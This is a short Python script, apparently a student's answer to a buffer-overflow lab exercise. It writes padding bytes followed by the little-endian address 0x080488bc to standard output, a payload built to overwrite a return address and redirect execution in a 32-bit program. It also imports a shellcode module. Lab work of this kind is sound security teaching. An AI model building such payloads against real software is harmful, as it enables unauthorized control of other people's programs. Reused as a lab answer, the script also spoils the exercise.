#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#080488bc
#print("AAAAAAAA\xbc\x88\x04\x08")
sys.stdout.buffer.write(pack("<I", 0x00000000))
sys.stdout.buffer.write(pack("<I", 0x00000000))
sys.stdout.buffer.write(pack("<I", 0x080488bc))

